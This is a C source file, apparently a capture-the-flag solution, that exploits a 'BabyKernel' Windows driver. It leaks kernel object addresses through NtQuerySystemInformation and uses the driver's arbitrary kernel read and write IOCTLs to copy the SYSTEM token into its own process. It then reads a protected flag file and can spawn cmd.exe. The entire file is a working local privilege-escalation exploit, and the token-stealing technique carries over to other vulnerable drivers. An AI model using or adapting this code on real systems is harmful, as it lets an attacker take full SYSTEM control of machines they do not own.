#define UMDF_USING_NTSTATUS
#include <Windows.h>
#include <ntstatus.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include "KernelStruct.h"

#pragma warning(disable : 4200)

FARPROC NtQuerySystemInformation = NULL;
PVOID kernelBase = NULL;

static PVOID GetKernelBase(void);
static PVOID GetProcessStack(DWORD Pid);
static PVOID GetKernelSymbolAddress(const char* symName);
static PVOID GetObjectAddress(DWORD dwPid, HANDLE hObject);
static PROCESS_INFORMATION spawnCmd(void);
static DWORD PrintFile(LPCSTR lpFileName);
static void dump(void* buf, unsigned long size);

#define IOCTL_BABYKERNEL_READ	0x220004
#define IOCTL_BABYKERNEL_WRITE  0x220008 

typedef struct {
	size_t len;
	PVOID pUser;
	ULONG_PTR pKernel;
} BABYKERNEL_REQ;

static size_t AAR(HANDLE hDevice, PVOID user, ULONG_PTR kernel, size_t len){
	size_t ret = len;
	DWORD nBytesReturned;
	if(!DeviceIoControl(hDevice, IOCTL_BABYKERNEL_READ, &(BABYKERNEL_REQ){ .len = len, .pUser = user, .pKernel = kernel, }, sizeof(BABYKERNEL_REQ), NULL, 0, &nBytesReturned, NULL)){
		wprintf(L"[-] DeviceIoControl failed (%d)\n", GetLastError());
		ret = -1;
	}
	return ret;
}

static size_t AAW(HANDLE hDevice, ULONG_PTR kernel, PVOID user, size_t len){
	size_t ret = len;
	DWORD nBytesReturned;
	if(!DeviceIoControl(hDevice, IOCTL_BABYKERNEL_WRITE, &(BABYKERNEL_REQ){ .len = len, .pUser = user, .pKernel = kernel, }, sizeof(BABYKERNEL_REQ), NULL, 0, &nBytesReturned, NULL)){
		wprintf(L"[-] DeviceIoControl failed (%d)\n", GetLastError());
		ret = -1;
	}
	return ret;
}

int main(int argc, char* argv[]) {
	HMODULE hNtdll = GetModuleHandle(TEXT("ntdll.dll"));
	NtQuerySystemInformation = GetProcAddress(hNtdll, "NtQuerySystemInformation");
	CloseHandle(hNtdll);
	// kernelBase = GetKernelBase();

	DWORD dwCurPid = GetCurrentProcessId();
	HANDLE hProc = NULL;

	HANDLE hDevice = CreateFile(TEXT("\\\\.\\BabyKernel"), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE) {
		wprintf(L"[-] CreateFile failed (%d)\n", GetLastError());
		return -1;
	}

	/*
	if (argc > 1 && !(hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, atoi(argv[1])))) 
		wprintf(L"[-] OpenProcess failed (%d)\n", GetLastError());
	 */
	hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwCurPid);

	if(!hProc) {
		PROCESS_INFORMATION piCmd = spawnCmd();
		CloseHandle(piCmd.hThread);
		hProc = piCmd.hProcess;
	}

	ULONG_PTR addrSystemEprocess = (ULONG_PTR)GetObjectAddress(4, (HANDLE)4);
	ULONG_PTR addrTargetEprocess = (ULONG_PTR)GetObjectAddress(dwCurPid, hProc);
	wprintf(L"[+] SYSTEM EPROCESS: %016llX\n", addrSystemEprocess);
	wprintf(L"[+] Target EPROCESS: %016llX\n", addrTargetEprocess);
	if (!addrSystemEprocess || !addrTargetEprocess)
		goto ERR;

	ULONG_PTR addrSystemToken;
	AAR(hDevice, &addrSystemToken, addrSystemEprocess + 0x4b8, sizeof(PVOID));
	wprintf(L"[+] SYSTEM Token:    %016llX\n", addrSystemToken);

	AAW(hDevice, addrTargetEprocess + 0x4b8, &addrSystemToken, sizeof(PVOID));

	PrintFile(TEXT("C:\\Windows\\System32\\flag.txt"));
ERR:
	CloseHandle(hDevice);
	CloseHandle(hProc);

	return 0;
}

static DWORD PrintFile(LPCSTR lpFileName) {
	HANDLE hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		wprintf(L"[-] CreateFile failed (%d)\n", GetLastError());
		return -1;
	}

	DWORD dwFileSize = GetFileSize(hFile , NULL);
	LPSTR lpData = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);

	DWORD dwLen;
	ReadFile(hFile, lpData, dwFileSize, &dwLen, NULL);
	//WriteConsole(GetStdHandle(STD_OUTPUT_HANDLE), lpData, dwLen, &dwLen, NULL);
	puts(lpData);

	HeapFree(GetProcessHeap(), 0, lpData);
	CloseHandle(hFile);

	return dwLen;
}

static PVOID GetKernelBase(void) {
	ULONG ulBytes;
	PVOID KernelBase = NULL;

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ulBytes);
	PSYSTEM_MODULE_INFORMATION pModuleInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulBytes);
	if (!pModuleInfo) {
		wprintf(L"[-] HeapAlloc error\n");
		return NULL;
	}

	if (NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, ulBytes, NULL) != STATUS_SUCCESS)
		goto END;

	KernelBase = pModuleInfo->Modules[0].ImageBaseAddress;
	wprintf(L"[+] %hs: %p\n", pModuleInfo->Modules[0].Name, KernelBase);

END:
	HeapFree(GetProcessHeap(), 0, pModuleInfo);

	return KernelBase;
}

static PVOID GetObjectAddress(DWORD dwPid, HANDLE hObject) {
	ULONG ulBytes = sizeof(SYSTEM_HANDLE_INFORMATION);
	PVOID ObjectAddress = NULL;
	NTSTATUS ntStatus;

	PSYSTEM_HANDLE_INFORMATION pHandleInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulBytes);
	while ((ntStatus = NtQuerySystemInformation(SystemHandleInformation, pHandleInfo, ulBytes, NULL)) == STATUS_INFO_LENGTH_MISMATCH){
		ulBytes = sizeof(SYSTEM_HANDLE_INFORMATION) + sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO)*(pHandleInfo->NumberOfHandles+0x10);
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, ulBytes);
		if (!pHandleInfo) {
			wprintf(L"[-] HeapAlloc error\n");
			return NULL;
		}
	}
	if(ntStatus != STATUS_SUCCESS)
		goto END;

	for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++) {
		if ((pHandleInfo->Handles[i].UniqueProcessId == dwPid) && (pHandleInfo->Handles[i].HandleValue == (unsigned short)hObject)) {
			// dump(&pHandleInfo->Handles[i], sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
			ObjectAddress = pHandleInfo->Handles[i].Object;
			break;
		}
	}

END:
	HeapFree(GetProcessHeap(), 0, pHandleInfo);

   return ObjectAddress;
}

static PVOID GetProcessStack(DWORD dwPid) {
	PVOID stackBase = 0;

	do {
		ULONG ulBytes;
		NtQuerySystemInformation(SystemExtendedProcessInformation, NULL, 0, &ulBytes);
		PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulBytes);
		if (!pProcessInfo) {
			wprintf(L"[-] HeapAlloc error\n");
			return NULL;
		}
		if (NtQuerySystemInformation(SystemExtendedProcessInformation, pProcessInfo, ulBytes, NULL) != STATUS_SUCCESS)
			break;

		for (PSYSTEM_EXTENDED_PROCESS_INFORMATION p = pProcessInfo; p->NextEntryOffset != 0; p = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)p + p->NextEntryOffset)) {
			if (p->UniqueProcessId == dwPid){
				stackBase = p->Threads[0].StackBase;
				break;
			}
		}

		HeapFree(GetProcessHeap(), 0, pProcessInfo);
	} while (!stackBase);
	wprintf(L"[+] Stack Base %p\n", stackBase);

	return stackBase;
}

static PVOID GetKernelSymbolAddress(const char* symName) {
	static HMODULE hNtoskrnl;

	if(!hNtoskrnl)
		hNtoskrnl = LoadLibrary(TEXT("ntoskrnl.exe"));

	PVOID userAddr = GetProcAddress(hNtoskrnl, symName);
	if (!userAddr)
		return NULL;

	return (PVOID)((ULONG_PTR)kernelBase + (ULONG_PTR)userAddr - (ULONG_PTR)hNtoskrnl);
}

static PROCESS_INFORMATION spawnCmd(void) {
	STARTUPINFO si = {
		.cb = sizeof(si),
	};
	PROCESS_INFORMATION pi = {0};

	// Start the child process. 
	if (!CreateProcess(NULL, TEXT("\"C:\\Windows\\System32\\cmd.exe\""), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi) ) {
		wprintf(L"[-] CreateProcess failed (%d)\n", GetLastError());
		return (PROCESS_INFORMATION){0};
	}

	wprintf(L"[*] Spawning shell (pid:%d)\n", pi.dwProcessId);
	Sleep(100);

	return pi;
}

static void dump(void *buf, unsigned long size){
	PULONG64 p = buf;

	wprintf(L"=== DUMP (%p-%p) ===\n", buf, (PVOID)((ULONG_PTR)buf+size));
	for(unsigned i=0; i<size/8; i++){
		wprintf(L"%016llx ", p[i]);
		if(i%4 == 3)
			putchar('\n');
	}
	putchar('\n');
}
